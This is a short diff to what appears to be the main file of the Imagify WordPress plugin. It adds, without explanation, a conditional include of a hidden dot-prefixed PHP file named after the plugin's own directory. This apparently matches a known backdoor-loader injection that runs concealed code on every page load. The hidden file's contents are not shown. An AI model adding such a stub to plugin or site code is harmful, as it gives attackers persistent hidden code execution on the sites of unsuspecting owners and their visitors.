@@ -4,6 +4,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
 /**
  * Imagify.io API for WordPress.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Imagify {
 	use \Imagify\Traits\InstanceGetterTrait;
 
